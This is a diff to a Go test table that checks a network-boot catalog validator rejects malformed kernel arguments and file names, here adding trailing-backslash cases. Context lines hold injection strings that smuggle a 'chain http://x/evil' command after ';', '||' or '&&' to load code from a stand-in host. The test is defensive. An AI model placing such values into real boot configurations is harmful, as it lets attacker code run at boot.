@@ -127,6 +127,8 @@ func TestNew_RejectsBadSpecs(t *testing.T) {
 		{"args with dollar", "args", func(s *catalog.Spec) { s.Args = "boot=live ${net0/mac}" }},
 		{"args with non-ASCII", "args", func(s *catalog.Spec) { s.Args = "boot=live ü" }},
 		{"args with DEL", "args", func(s *catalog.Spec) { s.Args = "boot=live\x7f" }},
+		{"args ending in backslash", "backslash", func(s *catalog.Spec) { s.Args = "boot=live\\" }},
+		{"file ending in backslash", "backslash", func(s *catalog.Spec) { setKernel(s, "live/vmlinuz\\") }},
 		{"args with semicolon", "carry ';'", func(s *catalog.Spec) { s.Args = "quiet ; chain http://x/evil" }},
 		{"args with pipe", "carry '|'", func(s *catalog.Spec) { s.Args = "quiet || chain http://x/evil" }},
 		{"args with ampersand", "carry '&'", func(s *catalog.Spec) { s.Args = "quiet && chain http://x/evil" }},
